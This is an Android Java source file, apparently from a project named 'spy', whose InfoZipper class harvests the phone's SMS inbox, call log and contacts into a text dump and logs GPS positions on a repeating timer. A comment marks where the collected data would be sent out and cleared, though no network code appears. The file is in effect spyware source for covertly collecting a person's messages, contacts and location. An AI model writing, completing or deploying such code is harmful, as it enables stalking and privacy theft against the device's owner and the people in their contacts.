package com.spy.spy;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;

import com.google.gson.*;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.StringBufferInputStream;
import java.io.StringWriter;
import java.io.Writer;
import java.sql.Time;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by lncosie on 2015/10/28.
 */
public class InfoZipper {
    Context context;
    Writer writer = null;
    GpsRecorder gpsRecorder=new GpsRecorder();
    public void setContext(Context context){
        this.context=context;
    }
    void readSMS() throws IOException {
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        readCursor(cursor);
    }
    void readCalls() throws IOException {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        readCursor(cursor);
    }
    void readContacts() throws IOException {
        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        readCursor(cursor);
    }
    void startGpsRecord(){
        gpsRecorder.recordOne();
    }
    public String gpsInfo(){
        return gpsRecorder.toString();
    }
    @Override
    public String toString(){
        writer=new StringWriter(512);
        try {
            readCalls();
            readContacts();
            readSMS();
        } catch (IOException e) {
            return writer.toString();
        }
        return writer.toString();
    }
    class GpsRecorder {

        LocationManager locationManager = null;
        Timer timer=new Timer();
        long  durtion=50000;
        Writer gps=new StringWriter(512);
        GpsRecorder(){
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
            try {
                gps.write(sdf.format(new Date()));
            } catch (IOException e) {

            }finally {
                //if(gps.size()>1000){send and clear}
            }
        }
        void recordOne(){
            timer.schedule(record5min,durtion);
        }
        TimerTask   record5min=new TimerTask(){
            @Override
            public void run() {
                try{
                    GpsRecorder.this.locationManager=(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, listener);
                }catch (Exception e){

                }
            }
        };
        LocationListener listener=new LocationListener(){
            @Override
            public void onLocationChanged(Location loc) {
                try {
                    gps.append('\n');
                    gps.append(loc.toString());
                } catch (IOException e) {

                }finally {
                    GpsRecorder.this.locationManager=null;
                    recordOne();
                }
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };
        @Override
        public String toString(){
            String to=gps.toString();
            gps=new StringWriter(512);
            return to;
        }
    }


    private void decodeLocation(Location loc) {
        Geocoder gcd = new Geocoder(context, Locale.getDefault());
        List<Address> addresses;
        try {
            addresses = gcd.getFromLocation(loc.getLatitude(),
                    loc.getLongitude(), 1);
            if (addresses.size() > 0)
                System.out.println(addresses.get(0).getLocality());
            String cityName = addresses.get(0).getLocality();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    private void readCursor(Cursor cursor) throws IOException {
        if (cursor.moveToFirst())
            for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                writer.append(String.valueOf(idx));
                writer.append('\t');
                writer.append(cursor.getColumnName(idx));
            }
        do {
            for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                writer.append(cursor.getString(idx));
                writer.append('\t');
            }
            writer.append('\n');
        } while (cursor.moveToNext());
    }
}